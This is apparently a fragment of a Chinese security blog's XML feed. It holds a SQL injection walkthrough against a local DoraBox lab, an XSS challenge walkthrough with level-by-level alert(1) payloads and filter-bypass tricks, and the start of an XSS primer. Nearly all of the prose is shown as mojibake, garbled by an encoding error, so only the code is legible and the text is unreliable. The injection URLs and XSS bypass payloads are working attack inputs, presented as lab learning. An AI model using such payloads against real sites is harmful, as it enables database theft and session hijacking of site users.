table_name!=&#39;account&#39;--+&amp;submit=submit</code>å…¶ä¸­å¯ä»¥å°†<code>!=</code>æ¢æˆ<code>&lt;&gt;</code>æ˜¯åŒæ ·çš„æ•ˆæœã€‚<img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679332502596.jpg" srcset="/img/loading.gif" alt="-w916"><br>ç»§ç»­åœ¨è¯­å¥ä¸­åŠ <code>andå’Œä¸ç­‰äºå‰é¢æŸ¥å‡ºçš„è¡¨çš„åå­—</code>ï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679333657212.jpg" srcset="/img/loading.gif" alt="-w989"><br><strong>æˆ‘ä»¬å‘ç°è¿™æ ·å¾ˆç¹çï¼Œå¦‚ä½•èƒ½å¤Ÿè®©ä¸€ä¸‹å­å…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥å‘¢ï¼Œç”¨åˆ°äº†<code>group_cancat()</code>å‡½æ•°ï¼š</strong><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679337786295.jpg" srcset="/img/loading.gif" alt="-w1028"></p><p>ç„¶åæˆ‘ä»¬ç»§ç»­å»æŸ¥åˆ—åï¼Œç„¶åè½¬åˆ°<code>infromation_schema</code>çš„<code>columns</code>ä¸‹ï¼Œä¸€ç›´æœç´¢<code>account</code>ä¸‹æ»‘å‘ç°ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªåˆ—è¡¨ä¸‹å¯ä»¥æ‹¿åˆ°æ›´å…¨çš„ä¿¡æ¯ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679344981875.jpg" srcset="/img/loading.gif" alt="-w1162"></p><p>å»å¯¹æ¯”ä¸‹<code>account</code>è¡¨ä¸‹çš„åˆ—åä¿¡æ¯ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679342199859.jpg" srcset="/img/loading.gif" alt="-w189"><br>æ˜¯ç›¸å¯¹åº”çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ›´æ”¹ä¸‹è¯­å¥ï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679346900575.jpg" srcset="/img/loading.gif" alt="-w1012"><br>å‘ç°æˆ‘ä»¬è¿˜å¯ä»¥æ‹¿åˆ°è¿™ä¸ªè¡¨åï¼Œå¯¹æ¯”æ•°æ®åº“æˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‰ç…§è¡¨åå‡ºç°çš„ä¸ªæ•°çœ‹å‡ºå…¶è¡¨ä¸‹æœ‰å¤šå°‘åˆ—ã€‚ç„¶åæˆ‘ä»¬æ‹¿<code>news</code>æµ‹è¯•ä¸‹è·å–åˆ—åï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679349902804.jpg" srcset="/img/loading.gif" alt="-w1049"></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSSæŒ‘æˆ˜ä¹‹æ—…</title>
    <link href="/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
    <url>/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h1 id="XSSæŒ‘æˆ˜ä¹‹æ—…"><a href="#XSSæŒ‘æˆ˜ä¹‹æ—…" class="headerlink" title="XSSæŒ‘æˆ˜ä¹‹æ—…"></a>XSSæŒ‘æˆ˜ä¹‹æ—…</h1><h2 id="å…³å¡"><a href="#å…³å¡" class="headerlink" title="å…³å¡"></a>å…³å¡</h2><h3 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h3><p>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668211760590.jpg?raw=true" srcset="/img/loading.gif" alt><br>æ­¤é¢˜æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ„é€ è¯­å¥ï¼Œåœ¨æ ‡ç­¾ä¹‹é—´è¿›è¡Œè¾“å‡ºã€‚</p><h3 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668215829302.jpg?raw=true" srcset="/img/loading.gif" alt><br>æ­¤é¢˜å˜æˆäº†<code>&lt;input&gt;</code>æ ‡ç­¾ï¼Œçœ‹åˆ°æ­¤å¤„åå¯ä»¥è€ƒè™‘ï¼Œæå‰é—­åˆæ‰è¿™ä¸ªæ ‡ç­¾ï¼Œæ‰€ä»¥æ„é€ payloadï¼š<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œ<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221905952.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>æˆ–è€…ä¹Ÿå¯ä»¥payloadï¼š<code>&quot; onclick=alert(1)&gt;</code>è¿™ä¸ªéœ€è¦ç‚¹å‡»æœç´¢åï¼Œå†ç‚¹å‡»æœç´¢æ¡†ï¼Œå±äºå€ŸåŠ©jsäº‹ä»¶ç±»å‹ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221627239.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668225398647.jpg?raw=true" srcset="/img/loading.gif" alt><br>å˜æˆäº†å•å¼•å·çš„inputæ ‡ç­¾ï¼Œå…ˆå°è¯•é—­åˆinputæ ‡ç­¾è¿™ä¸ªæ€è·¯ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227235348.jpg?raw=true" srcset="/img/loading.gif" alt><br>å‘ç°æ²¡æœ‰è¿‡å»ï¼Œå»çœ‹ä¸‹ç½‘é¡µä»£ç ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227746468.jpg?raw=true" srcset="/img/loading.gif" alt><br>å‘ç°å…¶è¿‡æ»¤äº†<code>&lt; &gt;</code>,è¿™æ ·åªèƒ½é€šè¿‡jsäº‹ä»¶æ¥æ„é€ å¼¹çª—ã€‚<br>è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œä¸è¿‡æ­¤å¤„æ˜¯å•å¼•å·ï¼Œæ‰€ä»¥æ„é€ payloadï¼š<br><code>&#39; onclick=&#39;alert(1)</code><br>æ³¨æ„æ­¤å¤„çš„<code>alert(1)</code>çš„å‰é¢è¿˜æœ‰ä¸ªå•å¼•å·ï¼Œå…¶æ•ˆæœå°±æ˜¯<code>value=&#39;&#39; onclick=&#39;alert(1)&#39;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668232441274.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669039155180.jpg?raw=true" srcset="/img/loading.gif" alt><br>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œè¿˜æ˜¯è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œä¸è¿‡æ˜¯å•å¼•å·æ¢æˆäº†åŒå¼•å·ã€‚æŒ‰ç…§åŸæ¥çš„æ€è·¯ï¼Œæ„é€ payloadï¼š<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669038872074.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h3><p>çœ‹ç½‘é¡µæºä»£ç ï¼Œè·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œç›´æ¥å…ˆæµ‹è¯•ä¸Šé¢˜çš„payloadã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669042011764.jpg?raw=true" srcset="/img/loading.gif" alt><br><code>&lt;input name=keyword  value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;</code>å†æ¬¡æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹å‡ºå¯¹onè¿›è¡Œäº†è¿‡æ»¤ï¼Œåœ¨å°è¯•åŒå†™ã€æ”¹å˜å¤§å°å†™æ— æœåã€‚æ¢æ€è·¯çœ‹çœ‹<code>&lt; &gt;</code>æ˜¯å¦è¿‡æ»¤ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤ã€‚ç„¶åè€ƒè™‘å…ˆé—­åˆinputæ ‡ç­¾ï¼Œç„¶åæ„é€ ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»åè°ƒç”¨jsäº‹ä»¶ã€‚<br>payload=<code>&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br>ç„¶åç‚¹å‡»å°±okäº†ã€‚</p><h3 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h3><p>ç¬¬å…­å…³ç›´æ¥æµ‹è¯•ä¸Šé¢˜çš„payloadï¼Œæ— æ³•é€šè¿‡ï¼Œç„¶åçœ‹ç½‘é¡µæºä»£ç ï¼š<br><code>&lt;input name=keyword  value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;</code><br>å‘ç°hrefé­åˆ°äº†è¿‡æ»¤ï¼Œç»“æœå‘ç°æ”¹å˜å¤§å°å†™å¯ä»¥ç»•è¿‡ã€‚<br>payloadï¼š<code>&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669054032946.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h3><p>è¿˜æ˜¯å…ˆæµ‹è¯•ä¸Šé¢˜çš„payloadï¼Œç„¶åæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ï¼š<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669056409336.jpg?raw=true" srcset="/img/loading.gif" alt><br>hrefä¸scriptç›´æ¥è¢«æ›¿æ¢æˆäº†ç©ºï¼Œç„¶åè€ƒè™‘åŒå†™ç»•è¿‡ï¼Œæ„é€ payloadï¼š<code>&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669055755331.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060160351.jpg?raw=true" srcset="/img/loading.gif" alt><br>å‘ç°æœ‰äº›ä¸ä¸€æ ·äº†ï¼Œç„¶åå…ˆç‚¹ä¸‹â€æ·»åŠ å‹æƒ…é“¾æ¥â€œæŒ‰é’®ï¼Œå»çœ‹ä¸‹ç½‘é¡µæºä»£ç ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060975749.jpg?raw=true" srcset="/img/loading.gif" alt><br>ä¼šå‘ç°è¿™ä¸ªé¢˜æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹æ¥è¿›è¡Œxssæ”»å‡»ã€‚å…ˆæ„é€ payloadï¼š<code>javascript:alert(1)</code>ï¼Œæ— æ³•é€šè¿‡ï¼Œç„¶åæŸ¥çœ‹æºä»£ç <code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code>å¯ä»¥å‘ç°å…¶è¿‡æ»¤äº†å­—ç¬¦ä¸²scriptï¼Œå› ä¸ºæ­¤å¤„ä¸ºhtmlæ ‡è®°è¯­è¨€ï¼Œè€ƒè™‘æŠŠâ€râ€è½¬æ¢ä¸ºHTMLå®ä½“æ¥ç»•è¿‡ã€‚<br>æ„é€ payloadï¼š<code>javasc&amp;#114;ipt:alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669059745275.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669066979885.jpg?raw=true" srcset="/img/loading.gif" alt><br>è¿™é¢˜è¿˜æ˜¯è·Ÿä¸Šé¢˜ä¸€ä¸ªç±»å‹ï¼Œä½†æ˜¯å‘ç°ä¸ç®¡åŠ å…¥ä»€ä¹ˆéƒ½æ˜¾ç¤ºè¿™ä¸ªã€‚ä¸å¦‚åŠ å…¥ä¸ªæ­£å¸¸åˆæ³•é“¾æ¥è¯•ä¸€è¯•ï¼Œ<code>http://www.baidu.com</code>,å‘ç°æ˜¾ç¤ºæ­£å¸¸äº†ï¼Œç»è¿‡æµ‹è¯•åå‘ç°å…¶åœ¨æ£€æµ‹åˆ°<code>http://</code>åæ‰ä¼šæ­£å¸¸æ˜¾ç¤ºä½ çš„ä»£ç ã€‚æ‰€ä»¥æ„é€ payloadï¼š<code>javasc&amp;#114;ipt:alert(1)//http://</code><br>æ³¨æ„â€//â€œè¿™ä¸ªæ˜¯æ¥æ³¨é‡Šåé¢çš„ä»£ç çš„ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669068046610.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669071677201.jpg?raw=true" srcset="/img/loading.gif" alt><br>è¿›æ¥ä»¥åå‘ç°æ— ä»»ä½•å¯è¾“å…¥çš„åœ°æ–¹ï¼Œç„¶åå°±æŸ¥çœ‹æºä»£ç <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669072118291.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>å‘ç°å…¶typeç±»å‹å…¨æ˜¯hiddenï¼Œç„¶åè€ƒè™‘æ˜¯ä¸æ˜¯è€ƒå¯Ÿè¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œåœ¨æŸ¥è¯¢åå‘ç°å¤§å¤šè§£å†³åŠæ³•å°±æ˜¯æŠŠhiddenï¼Œæ”¹ä¸ºtextç±»å‹ã€‚å› ä¸ºåœ¨æµè§ˆå™¨getåˆ°<code>type=â€***â€œ</code>ï¼Œå³å¯æŠŠåŸæ¥çš„typeç»™æ›¿æ¢æ‰€ä»¥è€ƒè™‘æ„é€ payloadï¼š<br><code>&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br>ç„¶åä¼šå‡ºç°ä¸ªè¾“å…¥æ¡†ï¼Œç‚¹å‡»åå³å¯è¿‡å…³ã€‚<strong>æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯æŸ¥çœ‹æºä»£ç åå‘ç°æœ‰ä¸‰ä¸ªinputæ ‡ç­¾ï¼Œä½†å®é™…æµ‹è¯•åªæœ‰æœ€åä¸€ä¸ª<code>name=&quot;t_sort&quot;</code>æ‰ä¼šå‡ºç°æ–‡æœ¬æ¡†ï¼Œæ‰€ä»¥æ„é€ äº†ä»¥æœ€åä¸€ä¸ªæ ‡ç­¾ä¸ºæ”»å‡»ç‚¹çš„payloadã€‚</strong><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669081314821.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669077403237.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³"></a>ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³</h3><p>è¿™å‡ å…³éƒ½æ˜¯httpå¤´æ³¨å…¥éœ€è¦æŠ“åŒ…æ¥å®Œæˆï¼ŒåŸºæœ¬å¤§å·®ä¸å·®çš„ã€‚<br>ç¬¬åä¸€å…³ Referer<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669099835862.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669091402139.jpg?raw=true" srcset="/img/loading.gif" alt><br>ç¬¬åäºŒå…³ ua<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669102310614.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101896563.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101286592.jpg?raw=true" srcset="/img/loading.gif" alt><br>ç¬¬åä¸‰å…³ cookie<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103883723.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103999546.jpg?raw=true" srcset="/img/loading.gif" alt><br>æ˜æ˜¾æ˜¯cookieæ³¨å…¥äº†<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669104596197.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬åå››è‡³æœ€å"><a href="#ç¬¬åå››è‡³æœ€å" class="headerlink" title="ç¬¬åå››è‡³æœ€å"></a>ç¬¬åå››è‡³æœ€å</h3><p>è¿™å‡ é“é¢˜åŸºæœ¬éƒ½æ˜¯çœ‹ç€åˆ«äººçš„åšå®¢æ‰åšçš„ä¸‹æ¥ï¼Œå¹¶ä¸”åšäº†æ„Ÿè§‰ä¸æ˜¯å¤ªæ˜ç™½åŸç†ï¼Œå°±å…ˆä¸æ€»ç»“äº†ã€‚ä»¥åå­¦åˆ°æ›´æ·±çš„å†è¿›è¡Œæ€»ç»“ã€‚</p><h2 id="ç»•è¿‡å§¿åŠ¿å°è¡¥å……"><a href="#ç»•è¿‡å§¿åŠ¿å°è¡¥å……" class="headerlink" title="ç»•è¿‡å§¿åŠ¿å°è¡¥å……"></a>ç»•è¿‡å§¿åŠ¿å°è¡¥å……</h2><h3 id="â€œ-â€è¢«è¿‡æ»¤"><a href="#â€œ-â€è¢«è¿‡æ»¤" class="headerlink" title="â€œ()â€è¢«è¿‡æ»¤"></a>â€œ()â€è¢«è¿‡æ»¤</h3><p>ç”¨â€ ` â€œ å­—ç¬¦äº†æ¥ä»£æ›¿æ‹¬å·ã€‚</p><p>payload: alert`1`</p><h4 id="å°è¿›é˜¶-â€œ-â€œ-â€œ-â€åŒæ—¶è¢«è¿‡æ»¤"><a href="#å°è¿›é˜¶-â€œ-â€œ-â€œ-â€åŒæ—¶è¢«è¿‡æ»¤" class="headerlink" title="å°è¿›é˜¶ â€œ ` â€œ â€œ()â€åŒæ—¶è¢«è¿‡æ»¤"></a>å°è¿›é˜¶ â€œ ` â€œ â€œ()â€åŒæ—¶è¢«è¿‡æ»¤</h4><p>å¯ä»¥ä½¿ç”¨ <code>&lt;svg&gt;</code> æ ‡ç­¾ï¼Œå…¶æœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯å¯ä»¥æ‰§è¡ŒHTMLå®ä½“ä»£ç ã€‚ç”¨æ³•æ˜¯<code>&lt;svg&gt;&amp;#æ•°å­—;</code><br>æ‰€ä»¥æ„é€ payload:<br><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSSçŸ¥è¯†ç®€å•å­¦ä¹ </title>
    <link href="/2019/08/16/xss%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/08/16/xss%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XSSçŸ¥è¯†ç®€å•å­¦ä¹ "><a href="#XSSçŸ¥è¯†ç®€å•å­¦ä¹ " class="headerlink" title="XSSçŸ¥è¯†ç®€å•å­¦ä¹ "></a>XSSçŸ¥è¯†ç®€å•å­¦ä¹ </h1><h2 id="ä¸€-Xssç®€ä»‹"><a href="#ä¸€-Xssç®€ä»‹" class="headerlink" title="ä¸€:Xssç®€ä»‹"></a>ä¸€:Xssç®€ä»‹</h2><p>XSSæ”»å‡»å…¨ç§°<strong>è·¨ç«™è„šæœ¬æ”»å‡»</strong>ï¼Œæ˜¯ä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSï¼ŒXSSæ˜¯ä¸€ç§åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­æ¯”å¦‚è¿™äº›ä»£ç åŒ…æ‹¬HTMLä»£ç å’Œå®¢æˆ·ç«¯è„šæœ¬ã€‚æ”»å‡»è€…åˆ©ç”¨XSSæ¼æ´æ—è·¯æ‰è®¿é—®æ§åˆ¶â€”â€”ä¾‹å¦‚åŒæºç­–ç•¥(same origin policy)ã€‚è¿™ç§ç±»å‹çš„æ¼æ´ç”±äºè¢«é»‘å®¢ç”¨æ¥ç¼–å†™å±å®³æ€§æ›´å¤§çš„ç½‘ç»œé’“é±¼(Phishing)æ”»å‡»è€Œå˜å¾—å¹¿ä¸ºäººçŸ¥ã€‚å¯¹äºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé»‘å®¢ç•Œå…±è¯†æ˜¯ï¼šè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æ–°å‹çš„â€œç¼“å†²åŒºæº¢å‡ºæ”»å‡»â€œï¼Œè€ŒJavaScriptæ˜¯æ–°å‹çš„â€œShellCodeâ€ã€‚</p><h2 id="äºŒï¼šajaxç®€ä»‹"><a href="#äºŒï¼šajaxç®€ä»‹" class="headerlink" title="äºŒï¼šajaxç®€ä»‹"></a>äºŒï¼šajaxç®€ä»‹</h2><p>ajaxå…¶å®å°±æ˜¯å¼‚æ­¥JavaScriptå’Œxmlï¼Œå…¶æœ€å¤§ä¼˜åŠ¿åœ¨äºå¯ä»¥å®ç°å¼‚æ­¥è®¿é—®ã€‚<br>ä¸ºä»€ä¹ˆè¦ç”¨AJAXï¼Œé¦–å…ˆå®ƒå¤Ÿéšç§˜ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œæ— åˆ·æ–°â€ï¼Œå…¶æ¬¡ï¼Œå®ƒèƒ½æ›´æœ‰æ•ˆåœ°è¿…é€Ÿå¤„ç†å„ç§å¤æ‚å¤šå˜çš„æ•°æ®ã€‚å…¶å¯ä»¥å®ç°å¼‚æ­¥æ›´æ–°å’Œè·¨åŸŸã€‚</p><h2 id="ä¸‰ï¼šxssæ¼æ´åˆ†ç±»"><a href="#ä¸‰ï¼šxssæ¼æ´åˆ†ç±»" class="headerlink" title="ä¸‰ï¼šxssæ¼æ´åˆ†ç±»"></a>ä¸‰ï¼šxssæ¼æ´åˆ†ç±»</h2><h3 id="å­˜å‚¨XSS"><a href="#å­˜å‚¨XSS" class="headerlink" title="å­˜å‚¨XSS"></a>å­˜å‚¨XSS</h3><p>å­˜å‚¨XSS,ä¼šæŠŠæ”»å‡»è€…çš„æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ”»å‡»è¡Œä¸ºå°†ä¼´éšç€æ”»å‡»æ•°æ®ä¸€ç›´å­˜åœ¨ã€‚ä¹Ÿå°±æ˜¯æäº¤JSæ”»å‡»ä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ç„¶åå†è¾“å‡ºã€‚</p><p>ç”¨æˆ·è¾“å…¥çš„åœ°æ–¹æœ€å®¹æ˜“æ»‹ç”ŸXSSï¼Œè­¬å¦‚ç•™è¨€ã€è¯„è®ºç­‰è¡¨å•ï¼Œä¸€ä¸ªçš„ç•™è¨€æœ¬ï¼Œå› ä¸ºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä½œå‡ºåˆé€‚çš„è¿‡æ»¤ï¼Œå¯¼è‡´ä¸€ä¸ªXSSçš„äº§ç”Ÿã€‚ç•™è¨€ç‡å…ˆä¼ é€’ç»™ç®¡ç†å‘˜ï¼Œå½“ä½œjavascriptåŠ«æŒï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç®¡ç†å‘˜çš„æƒé™åšä»»ä½•äº‹æƒ…ã€‚å½“å†…å®¹é€šè¿‡å®¡æ ¸ï¼Œå‘å¸ƒåˆ°ç½‘ç«™ï¼Œæ­¤æ—¶æ‰€æœ‰çš„webæµè§ˆç”¨æˆ·éƒ½æœ‰å¯èƒ½å—åˆ°XSSï¼Œæˆ‘ä»¬èƒ½è·å¾—æ›´å¤šçš„ä¼šè¯åŠ«æŒã€‚ </p><h3 id="åå°„å‹XSSæ”»å‡»"><a href="#åå°„å‹XSSæ”»å‡»" class="headerlink" title="åå°„å‹XSSæ”»å‡»"></a>åå°„å‹XSSæ”»å‡»</h3><p>åå°„å‹XSSæ”»å‡»ä¹Ÿæ˜¯éæŒä¹…å‹XSSæ”»å‡»ï¼Œå…¶æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œä»…å¯¹å½“æ¬¡çš„é¡µé¢è®¿é—®äº§ç”Ÿå½±å“ã€‚éæŒä¹…å‹XSSæ”»å‡»è¦æ±‚ç”¨æˆ·è®¿é—®ä¸€ä¸ªè¢«æ”»å‡»è€…ç¯¡æ”¹åçš„é“¾æ¥ï¼Œç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œè¢«æ¤å…¥çš„æ”»å‡»è„šæœ¬è¢«ç”¨æˆ·æ¸¸è§ˆå™¨æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œå…¶æ˜¯ç»è¿‡æœåŠ¡å™¨çš„ã€‚</p><p>å…¶éœ€è¦é»‘å®¢è¿›è¡Œè¯±éª—ä½¿ç”¨æˆ·è®¿é—®è¿™ä¸ªå¸¦æœ‰xssæ”»å‡»çš„é“¾æ¥åï¼Œä¾¿è¢«JavaScriptåŠ«æŒï¼Œæ”¶åˆ°æ”»å‡»ã€‚</p><h3 id="Dom-xss"><a href="#Dom-xss" class="headerlink" title="Dom-xss"></a>Dom-xss</h3><p>é€šè¿‡URLä¼ å…¥å‚æ•°æ‰€è§¦å‘ï¼Œ<strong>å…¶ä¸ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡</strong>ï¼Œä½†æ˜¯æˆ‘ä»¬çš„jsæ”»å‡»ä»£ç å¯ä»¥è¢«æ‰§è¡Œï¼Œè¿™æ˜¯éœ€è¦åˆ†æé¡µé¢æºç ç„¶åè¿›è¡Œåˆ©ç”¨ï¼Œæ˜¯å­˜åœ¨å®¢æˆ·ç«¯é¡µé¢çš„è„šæœ¬è‡ªèº«ä¸­ã€‚</p><h2 id="å››ï¼šX-XSS-Protection"><a href="#å››ï¼šX-XSS-Protection" class="headerlink" 